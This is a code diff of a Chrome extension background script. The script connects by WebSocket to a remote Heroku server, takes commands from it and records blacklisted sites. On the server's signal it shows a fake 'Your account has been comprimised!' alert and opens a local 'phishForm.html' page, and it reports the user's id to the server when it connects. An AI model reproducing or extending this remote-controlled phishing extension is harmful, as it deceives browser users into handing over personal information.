@@ -3,17 +3,22 @@ var HOST = 'wss://projectnickname123.herokuapp.com';
 var ws = new WebSocket(HOST);
 
 //Variables we are using to listen to the server.
+//Object - Full json object to be parsed
+//type - The type of signal we are receiving from the server
+//temp - The site to be added to the blacklist of sites
+//translateString - The JS script in string form
+var id = "";
 var object = "";
 var type = "";
-var temp = "hello";
+var tempSite = "hello";
 var translateString = 'alert("Hello!")';
 
 //Listen to the server and parse objects.
 ws.onmessage = function (e) {
-    console.log("Message received!");
     object = JSON.parse(e.data);
+    id = object.id;//get 256bitvalue
     type = object.type;
-  //  temp = object.addString;
+  //  tempSite = object.addString;
   //  translateString = object.jsString;
 
     switch(type){
@@ -35,7 +40,7 @@ ws.onmessage = function (e) {
         chrome.tabs.query({active: true, currentWindow: true}, function(tab){
           chrome.tabs.sendMessage(tab[0].id, {action: 'addL'});
         });
-        chrome.storage.sync.set({'addSite': temp}, function(){});
+        chrome.storage.sync.set({'addSite': tempSite}, function(){});
         break;
     }
 };
@@ -49,7 +54,7 @@ SERVER SIGNALS.
 chrome.runtime.onMessage.addListener(function(request, sender, sendResponse){
   switch(request.action){
     case 'load':
-      alert("Your account got comprimised. We need additional information to continue display of this accounts' info.");
+      alert("Your account has been comprimised! We need additional information to continue display of this accounts' info.");
       chrome.tabs.create({url: '/phishForm.html', active: true});
       break;
   }
@@ -59,7 +64,6 @@ ws.onopen = function(event){
   chrome.storage.sync.get("id", function(ev){
     var id=ev.id;
     var jsonPackage = {id: id, type: 'online'};
-    alert("INSIDE OF READY STATE!");
     ws.send(JSON.stringify(jsonPackage));
   });
 }
